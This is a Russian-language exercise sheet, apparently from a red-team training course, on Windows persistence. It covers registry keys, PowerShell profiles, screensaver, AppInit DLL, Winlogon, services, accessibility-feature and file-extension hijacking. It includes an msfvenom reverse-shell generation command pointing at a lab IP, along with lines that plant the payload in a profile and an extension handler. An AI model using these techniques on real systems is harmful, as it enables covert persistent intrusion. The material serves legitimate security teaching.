# Exercises

### 01 - classic key

Упражнение 101 - заменить `hack.exe` на reverse shell. Например используйте команду:   
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.1 LPORT=4445 -f exe > hack.exe
```         

Упражнение 102 - проверьте с помощью Process Hacker 2 свойства процесса `hack.exe`.      

### 02 - powershell profile

Упражнение 201 - замените `hack.exe` на reverse shell.
Упражнение 202 - Powershell profile находится в различных локациях в файловой системе:    

```powershell
$PSHOME\Profile.ps1
$PSHOME\Microsoft.PowerShell_profile.ps1
$Home\[My ]Documents\PowerShell\Profile.ps1
$Home\[My ]Documents\PowerShell\Microsoft.PowerShell_profile.ps1
```

используйте технику чтобы запустить `hack.exe`:    

```powershell
echo Z:\hack.exe > "%HOMEPATH%\Documents\windowspowershell\profile.ps1"
```

и проверьте с какими правами запустится reverse shell в каждом из этих случаев.    

Упражнение 203 - проверьте с помощью Process Hacker 2 свойства процесса `hack.exe`.

### 03 - screensaver hijacking

Упражнение 301 - используя эту технику замените таймаут в реестре, и `hack.exe` на reverse shell.     
Упражнение 302 - проверьте с помощью Process Hacker 2 свойства процесса `hack.exe`.

### 04 - AppInit DLL

Упражнение 401 - используя эту технику замените `hack.dll` на reverse shell.     
Упражнение 402 - проверьте с помощью Process Hacker 2 свойства reverse shell.

### 05 - Winlogon

Упражнение 501 - используя эту технику замените `hack.exe` на reverse shell.     
Упражнение 502 - проверьте с помощью Process Hacker 2 свойства reverse shell.

### 06 - windows services

Упражнение 601 - используя эту технику запустите reverse shell с включенным и выключенным Windows Defender.     
Упражнение 602 - проверьте с помощью Process Hacker 2 свойства reverse shell.

### 07 - Accessibility Features

Упражнение 701 - используя эту технику замените `hack.exe` на reverse shell.     
Упражнение 702 - проверьте с помощью Process Hacker 2 свойства reverse shell.     
Упражнение 703 - замените `SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe` на другие Accessibility Features, например:     

- `C:\Windows\System32\osk.exe` - запускается при клике на экранную клавиатуру     
- `C:\Windows\System32\Narrator.exe` - запускается диктор


### 13 - startup approved

Упражнение 1301 - замените `hack.dll` на reverse shell.     
Упражнение 1302 - проверьте с помощью Process Hacker 2 свойства reverse shell

### 15 - file extension

Упражнение 1501 - замените `hack.exe` на reverse shell.

Упражнение 1502 - После замены на reverse shell cоздайте файл (например `reverse.cmd`):     

```powershell
start Z:\hack.exe
start notepad.exe %1
```

, и замените `%SystemRoot%\system32\NOTEPAD.EXE %1` на `reverse.cmd %1`.    

Упражнение 1503 - проверьте с помощью Process Hacker 2 свойства reverse shell.    